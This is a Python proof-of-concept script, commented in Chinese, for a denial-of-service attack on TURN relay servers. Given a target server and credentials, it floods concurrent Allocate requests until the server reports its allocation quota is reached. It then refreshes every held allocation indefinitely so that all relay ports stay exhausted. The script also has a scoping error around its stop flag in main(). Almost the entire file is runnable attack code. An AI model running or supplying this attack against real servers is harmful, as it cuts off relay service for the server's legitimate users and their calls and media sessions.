#!/usr/bin/env python3
"""
TURN DoS攻击POC - 攻击1：短时间发送n个allocation请求，占满所有可申请的中继端口
"""

import socket
import struct
import time
import argparse
import sys
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
TURN_UTILS_DIR = os.path.join(CURRENT_DIR, "turn_utils")

for path in (CURRENT_DIR, TURN_UTILS_DIR):
    if path not in sys.path:
        sys.path.insert(0, path)

from turn_utils.test_turn_capabilities import allocate_with_fallback
from turn_utils.turn_client import (
    STUN_ATTR_USERNAME,
    STUN_ATTR_REALM,
    STUN_ATTR_NONCE,
    STUN_ATTR_MESSAGE_INTEGRITY,
    STUN_ATTR_FINGERPRINT,
    STUN_MAGIC_COOKIE,
    resolve_server_address
)
# 直接从turn_client导入这些函数
import turn_utils.turn_client as turn_client
gen_tid = turn_client.gen_tid
stun_attr = turn_client.stun_attr
build_msg = turn_client.build_msg
parse_attrs = turn_client.parse_attrs
from config import DEFAULT_TURN_SERVER, DEFAULT_TURN_PORT

# STUN/TURN Refresh 常量（RFC 8656）
STUN_REFRESH_REQUEST = 0x0004
STUN_REFRESH_SUCCESS_RESPONSE = 0x0104
STUN_REFRESH_ERROR_RESPONSE = 0x0114
STUN_ATTR_ERROR_CODE = 0x0009
STUN_ATTR_LIFETIME = 0x000D  # RFC 8656 Section 18.2

# 全局统计
stats = {
    'total_requests': 0,
    'successful_allocations': 0,
    'failed_allocations': 0,
    'active_allocations': 0,
    'errors': defaultdict(int),
    'error_486_count': 0,  # 486错误计数
    'recent_486_count': 0,  # 最近486错误计数（用于判断是否频繁）
}
stats_lock = threading.Lock()

# 控制是否继续allocate
should_continue_allocating = True
should_continue_lock = threading.Lock()

# 存储活跃的allocation
active_allocations = []
allocations_lock = threading.Lock()

def refresh_allocation(sock, nonce, realm, integrity_key, server_address, username=None, lifetime=None, mi_algorithm=None):
    """
    刷新TURN分配
    
    Returns:
        (success, lifetime_value) 或 (False, None)
    """
    from turn_utils.turn_client import (
        build_msg_with_short_term_credential,
        build_msg_with_short_term_credential_sha256_only,
        build_msg_with_short_term_credential_sha1_only,
        USERNAME
    )
    
    auth_username = username or USERNAME
    
    tid = gen_tid()
    attrs = [
        stun_attr(STUN_ATTR_USERNAME, auth_username.encode()),
    ]
    
    if realm is not None:
        attrs.append(stun_attr(STUN_ATTR_REALM, realm))
    if nonce is not None:
        attrs.append(stun_attr(STUN_ATTR_NONCE, nonce))
    
    if lifetime is not None:
        attrs.append(stun_attr(STUN_ATTR_LIFETIME, struct.pack("!I", lifetime)))
    
    if nonce is None and realm is None:
        if mi_algorithm == 'sha256':
            req = build_msg_with_short_term_credential_sha256_only(STUN_REFRESH_REQUEST, tid, attrs, integrity_key, add_fingerprint=True)
        elif mi_algorithm == 'sha1':
            req = build_msg_with_short_term_credential_sha1_only(STUN_REFRESH_REQUEST, tid, attrs, integrity_key, add_fingerprint=True)
        else:
            req = build_msg_with_short_term_credential(STUN_REFRESH_REQUEST, tid, attrs, integrity_key, add_fingerprint=True)
    else:
        req = build_msg(STUN_REFRESH_REQUEST, tid, attrs, integrity_key, add_fingerprint=True)
    
    is_tcp_socket = False
    if hasattr(sock, '_sslobj') or sock.__class__.__name__ == 'SSLSocket':
        is_tcp_socket = True
    elif hasattr(sock, 'type'):
        try:
            sock_type = sock.type
            if (sock_type == socket.SOCK_STREAM or 
                (hasattr(sock_type, 'value') and getattr(sock_type, 'value', None) == 1) or
                int(sock_type) == 1):
                is_tcp_socket = True
        except (ValueError, TypeError, AttributeError):
            pass
    
    if not is_tcp_socket:
        try:
            sock.getpeername()
            is_tcp_socket = True
        except (AttributeError, OSError, socket.error):
            pass
    
    try:
        if is_tcp_socket:
            sock.send(req)
            sock.settimeout(10)
            data = sock.recv(2000)
        else:
            sock.sendto(req, server_address)
            sock.settimeout(10)
            data, _ = sock.recvfrom(2000)
        
        msg_type, tid, attrs = parse_attrs(data)
        
        if msg_type == STUN_REFRESH_SUCCESS_RESPONSE:
            lifetime_value = None
            if STUN_ATTR_LIFETIME in attrs:
                lifetime_value = struct.unpack("!I", attrs[STUN_ATTR_LIFETIME])[0]
            return True, lifetime_value
        elif msg_type == STUN_REFRESH_ERROR_RESPONSE:
            return False, None
        else:
            return False, None
    except (socket.timeout, Exception):
        return False, None

def keep_allocation_alive(allocation_info, server_address, username, refresh_interval=300):
    """
    保持allocation活跃，定期发送refresh请求
    
    Args:
        allocation_info: (sock, nonce, realm, integrity_key, actual_server_address, mi_algorithm)
        server_address: TURN服务器地址
        username: 用户名
        refresh_interval: refresh间隔（秒）
    """
    sock, nonce, realm, integrity_key, actual_server_address, mi_algorithm = allocation_info
    
    try:
        while True:
            time.sleep(refresh_interval)
            success, lifetime = refresh_allocation(sock, nonce, realm, integrity_key, 
                                                   server_address, username, 
                                                   mi_algorithm=mi_algorithm)
            if not success:
                # refresh失败，从活跃列表中移除
                with allocations_lock:
                    if allocation_info in active_allocations:
                        active_allocations.remove(allocation_info)
                with stats_lock:
                    stats['active_allocations'] = len(active_allocations)
                sock.close()
                break
    except Exception as e:
        # 发生异常，从活跃列表中移除
        with allocations_lock:
            if allocation_info in active_allocations:
                active_allocations.remove(allocation_info)
        with stats_lock:
            stats['active_allocations'] = len(active_allocations)
        try:
            sock.close()
        except:
            pass

def attempt_allocation(server_address, username, password, realm, server_hostname, allocation_id):
    """
    尝试单个allocation请求，检测486错误
    
    Returns:
        (success, allocation_info, error_code) 
        success: True/False
        allocation_info: 成功时的allocation信息，失败时为None
        error_code: 错误码（如486），成功时为None
    """
    try:
        with stats_lock:
            stats['total_requests'] += 1
        
        # 直接调用allocate_single_server以获取错误码
        from turn_utils.turn_client import allocate_single_server, STUN_ATTR_ERROR_CODE, STUN_ALLOCATE_ERROR_RESPONSE
        
        # 先尝试长期凭证
        result = allocate_single_server(server_address, username, password, realm, use_short_term_credential=False)
        
        # 如果失败，检查是否是486错误
        if not result:
            # 尝试短期凭证
            result = allocate_single_server(server_address, username, password, realm, use_short_term_credential=True)
        
        if result:
            sock, nonce, realm, integrity_key, actual_server_address, *extra = result
            mi_algorithm = extra[0] if extra else None
            allocation_info = (sock, nonce, realm, integrity_key, actual_server_address, mi_algorithm)
            
            with allocations_lock:
                active_allocations.append(allocation_info)
            
            with stats_lock:
                stats['successful_allocations'] += 1
                stats['active_allocations'] = len(active_allocations)
                # 成功时重置最近486计数
                stats['recent_486_count'] = 0
            
            print(f"[+] Allocation #{allocation_id} successful (Total: {stats['successful_allocations']}/{stats['total_requests']})")
            return True, allocation_info, None
        else:
            # 需要检查错误码，但allocate_single_server不返回错误码
            # 我们需要重新发送请求来检查错误码
            import socket
            from turn_utils.turn_client import build_msg, stun_attr, gen_tid, STUN_ALLOCATE_REQUEST, parse_attrs, STUN_ATTR_REQUESTED_TRANSPORT
            
            check_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            check_sock.settimeout(3)
            try:
                # 发送一个简单的请求来检查错误码
                tid = gen_tid()
                req = build_msg(STUN_ALLOCATE_REQUEST, tid, [
                    stun_attr(STUN_ATTR_REQUESTED_TRANSPORT, struct.pack("!B3s", 17, b"\x00\x00\x00"))
                ])
                check_sock.sendto(req, server_address)
                data, _ = check_sock.recvfrom(2000)
                msg_type, tid, attrs = parse_attrs(data)
                
                if msg_type == STUN_ALLOCATE_ERROR_RESPONSE:
                    error_code = attrs.get(STUN_ATTR_ERROR_CODE)
                    if error_code and len(error_code) >= 4:
                        error_class = error_code[2]
                        error_number = error_code[3]
                        error_code_value = error_class * 100 + error_number
                        
                        if error_code_value == 486:  # Allocation Quota Reached
                            with stats_lock:
                                stats['error_486_count'] += 1
                                stats['recent_486_count'] += 1
                            print(f"[-] Allocation #{allocation_id} failed: 486 Allocation Quota Reached (Total 486: {stats['error_486_count']})")
                            check_sock.close()
                            return False, None, 486
            except:
                pass
            finally:
                check_sock.close()
            
            with stats_lock:
                stats['failed_allocations'] += 1
                stats['errors']['allocation_failed'] += 1
            
            print(f"[-] Allocation #{allocation_id} failed (Total: {stats['failed_allocations']}/{stats['total_requests']})")
            return False, None, None
    
    except Exception as e:
        error_msg = str(e)
        with stats_lock:
            stats['failed_allocations'] += 1
            stats['errors'][error_msg] += 1
        
        print(f"[-] Allocation #{allocation_id} error: {error_msg}")
        return False, None, None

def print_stats():
    """打印统计信息"""
    with stats_lock:
        print("\n" + "="*70)
        print("📊 攻击统计")
        print("="*70)
        print(f"总请求数: {stats['total_requests']}")
        print(f"成功分配: {stats['successful_allocations']}")
        print(f"失败分配: {stats['failed_allocations']}")
        print(f"活跃分配: {stats['active_allocations']}")
        if stats['errors']:
            print("\n错误统计:")
            for error, count in stats['errors'].items():
                print(f"  {error}: {count}")
        print("="*70 + "\n")

def main():
    parser = argparse.ArgumentParser(description='TURN DoS攻击POC - 攻击1：持续占满所有可申请的中继端口')
    parser.add_argument('--turn-server', required=True, help='TURN服务器地址（域名或IP）')
    parser.add_argument('--turn-port', type=int, help='TURN服务器端口')
    parser.add_argument('--username', required=True, help='TURN服务器用户名')
    parser.add_argument('--password', required=True, help='TURN服务器密码')
    parser.add_argument('--realm', help='TURN服务器认证域')
    parser.add_argument('--concurrent', type=int, default=10, help='并发请求数（默认: 10）')
    parser.add_argument('--refresh-interval', type=int, default=300, help='Refresh间隔（秒，默认: 300）')
    parser.add_argument('--monitor-interval', type=int, default=5, help='统计信息打印间隔（秒，默认: 5）')
    parser.add_argument('--486-threshold', dest='error_486_threshold', type=int, default=5, help='连续486错误阈值，超过此值停止新分配（默认: 5）')
    
    args = parser.parse_args()
    
    print("="*70)
    print("🚨 TURN DoS攻击POC - 攻击1（持续模式）")
    print("="*70)
    
    # 解析TURN服务器地址
    server_address = resolve_server_address(args.turn_server, args.turn_port or DEFAULT_TURN_PORT)
    if not server_address:
        print("[-] Failed to resolve TURN server address")
        return
    
    print(f"[+] TURN Server: {server_address}")
    print(f"[+] Username: {args.username}")
    print(f"[+] 并发数: {args.concurrent}")
    print(f"[+] Refresh间隔: {args.refresh_interval}秒")
    print(f"[+] 486错误阈值: {args.error_486_threshold}（连续{args.error_486_threshold}次486错误后停止新分配）")
    print(f"[+] 模式: 持续allocate直到频繁遇到486错误，然后持续refresh")
    print()
    
    # 启动统计信息监控线程
    stop_monitoring = threading.Event()
    
    def monitor_stats():
        while not stop_monitoring.is_set():
            time.sleep(args.monitor_interval)
            print_stats()
    
    monitor_thread = threading.Thread(target=monitor_stats, daemon=True)
    monitor_thread.start()
    
    # 启动keep-alive线程池（总是启用）
    keep_alive_executor = ThreadPoolExecutor(max_workers=args.concurrent * 2)
    
    start_time = time.time()
    allocation_counter = 0
    
    try:
        # 持续allocate直到频繁遇到486错误
        with ThreadPoolExecutor(max_workers=args.concurrent) as executor:
            pending_futures = []
            
            while True:
                # 检查是否应该继续allocate
                with should_continue_lock:
                    if not should_continue_allocating:
                        print("[!] 检测到频繁486错误，停止发送新的allocation请求")
                        print("[!] 将继续refresh已有的allocation...")
                        break
                
                # 检查最近486错误计数
                with stats_lock:
                    if stats['recent_486_count'] >= args.error_486_threshold:
                        with should_continue_lock:
                            should_continue_allocating = False
                        print(f"[!] 检测到连续{stats['recent_486_count']}次486错误，停止新分配")
                        break
                
                # 提交新的allocation请求
                allocation_counter += 1
                future = executor.submit(
                    attempt_allocation,
                    server_address,
                    args.username,
                    args.password,
                    args.realm,
                    args.turn_server,
                    allocation_counter
                )
                pending_futures.append(future)
                
                # 处理已完成的请求
                completed_futures = [f for f in pending_futures if f.done()]
                for future in completed_futures:
                    pending_futures.remove(future)
                    try:
                        success, allocation_info, error_code = future.result()
                        
                        # 如果成功，启动keep-alive线程
                        if success and allocation_info:
                            keep_alive_executor.submit(
                                keep_allocation_alive,
                                allocation_info,
                                server_address,
                                args.username,
                                args.refresh_interval
                            )
                        
                        # 如果遇到486错误，更新统计
                        if error_code == 486:
                            with stats_lock:
                                if stats['recent_486_count'] >= args.error_486_threshold:
                                    with should_continue_lock:
                                        should_continue_allocating = False
                    except Exception as e:
                        print(f"[!] 处理allocation结果时出错: {e}")
                
                # 短暂延迟，避免请求过快
                time.sleep(0.1)
            
            # 等待所有pending请求完成
            print("[+] 等待所有pending请求完成...")
            for future in pending_futures:
                try:
                    success, allocation_info, error_code = future.result()
                    if success and allocation_info:
                        keep_alive_executor.submit(
                            keep_allocation_alive,
                            allocation_info,
                            server_address,
                            args.username,
                            args.refresh_interval
                        )
                except Exception as e:
                    print(f"[!] 处理pending allocation时出错: {e}")
    
    except KeyboardInterrupt:
        print("\n[!] 用户中断")
    except Exception as e:
        print(f"\n[-] 错误: {e}")
        import traceback
        traceback.print_exc()
    finally:
        stop_monitoring.set()
        print_stats()
        
        elapsed_time = time.time() - start_time
        print(f"\n[+] Allocation阶段完成，耗时: {elapsed_time:.2f}秒")
        print(f"[+] 成功分配: {stats['successful_allocations']}/{stats['total_requests']}")
        print(f"[+] 486错误总数: {stats['error_486_count']}")
        print(f"[+] 当前活跃分配: {stats['active_allocations']}")
        print(f"\n[+] 进入持续refresh模式，allocation将持续刷新...")
        print(f"[+] 按 Ctrl+C 停止并清理所有allocation")
        
        try:
            while True:
                time.sleep(1)
                with stats_lock:
                    if stats['active_allocations'] == 0:
                        print("[!] 所有allocation已失效")
                        break
        except KeyboardInterrupt:
            print("\n[!] 清理所有allocation...")
            with allocations_lock:
                for allocation_info in active_allocations[:]:
                    try:
                        sock = allocation_info[0]
                        sock.close()
                    except:
                        pass
                active_allocations.clear()
            print("[+] 清理完成")
        
        keep_alive_executor.shutdown(wait=False)

if __name__ == "__main__":
    main()

